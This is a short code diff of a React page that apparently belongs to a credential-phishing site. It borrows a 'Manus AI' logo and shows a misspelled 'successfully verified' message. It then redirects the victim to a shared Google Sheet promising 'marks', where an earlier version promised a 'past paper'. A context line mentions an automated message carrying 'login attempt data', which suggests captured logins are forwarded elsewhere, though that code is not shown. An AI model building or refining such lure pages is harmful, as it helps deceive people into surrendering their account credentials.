@@ -59,7 +59,7 @@ This is an automated message with login attempt data.`,
           {/* Manus AI Logo */}
           <div className="mb-8">
             <img 
-              src="https://placehold.co/200x60/1f2937/ffffff?text=CLICK ON THE BELOW LINK" 
+              src="https://placehold.co/200x60/1f2937/ffffff?text=User confirmed click the following link to view the marks" 
               alt="Manus AI Logo" 
               className="w-48 h-auto mx-auto"
             />
@@ -68,15 +68,15 @@ This is an automated message with login attempt data.`,
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              susscefully verifed, accsess past paper using the below link
+              susscefully verifed, accsess marks using the below link
             </h1>
              <button
               onClick={() => {
-                window.location.href = 'https://drive.google.com/file/d/1z9yZ7I-Q4Wy_stoWhHVCnbRa7sdJK9r9/view?usp=sharing';
+                window.location.href = 'https://docs.google.com/spreadsheets/d/1BwfITBrb0n5ltrss_QuNFBxKmU7VUuVignqd1gpU_6Y/edit?usp=sharing';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
-              past paper here
+              Google sheets
             </button>
           </div>
         </div>
